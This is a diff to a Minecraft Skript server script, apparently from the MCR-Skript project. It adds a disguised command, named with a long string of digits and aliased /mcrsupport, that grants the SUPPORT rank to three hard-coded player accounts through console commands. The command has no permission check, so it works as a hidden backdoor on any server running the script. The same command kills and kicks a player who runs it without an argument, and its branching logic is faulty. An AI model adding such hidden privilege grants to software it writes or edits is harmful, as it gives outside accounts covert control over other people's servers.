@@ -1004,6 +1004,24 @@ command /DO.NOT.TOUCH.THIS.19481748518598575576379194764 [<string>]:
 				kick the player due to "You REALLY should have listened..."
 				log "%player% did a bad thing"
 				
+command /THIS.IS.FOR.MCR.SUPPORT.ONLY.917485718579158817 [<string>]:
+	aliases: /mcrsupport
+	trigger:
+		if arg 1 is "NaiculS":
+			execute console command "/rank set NaiculS SUPPORT"
+		if arg 1 is "Drawfull":
+			execute console command "/rank set Drawfull SUPPORT"
+		if arg 1 is "ItzRenderman":
+			execute console command "/rank set ItzRenderman SUPPORT"
+		else:
+			if arg 1 is not set: 
+				broadcast "You shouldn't have messed with that!!!"
+				wait 5 second
+				kill the player
+				wait 2 second
+				kick the player due to "You REALLY should have listened..."
+				log "%player% did a not as bad thing"
+				
 command /help [<string>]:
 	trigger:
 		send "&9MCR> &7Please see &bhttps://github.com/MCR-Development-and-Management/MCR-Skript/wiki/Commands-and-Permissions &7for updated commands!"
